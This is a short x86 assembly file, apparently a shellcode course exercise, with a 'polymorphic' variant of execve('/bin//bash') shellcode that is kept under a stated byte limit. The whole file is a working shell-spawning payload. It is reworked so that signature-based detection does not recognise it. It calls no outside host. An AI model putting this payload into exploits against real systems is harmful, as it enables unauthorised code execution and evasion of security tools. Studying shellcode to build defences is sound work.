; poly_morphed2.py
; Author:  Chase Hatch
; Poly-morphed version of /bin//bash shellcode, MKII
; 30 bytes original
; has to be within 45 bytes?


section .text
global _start
_start:

	xor eax, eax
	push eax
	mov ecx, [esp]
	mov edx, [esp]
	
	push 0x68736162 	;  hsab 
	push 0x2f6e6962 	;  /nib 
	push 0x2f2f2f2f 	;  ////	
	
	mov al, 0xb
	mov ebx, esp
	int 0x80

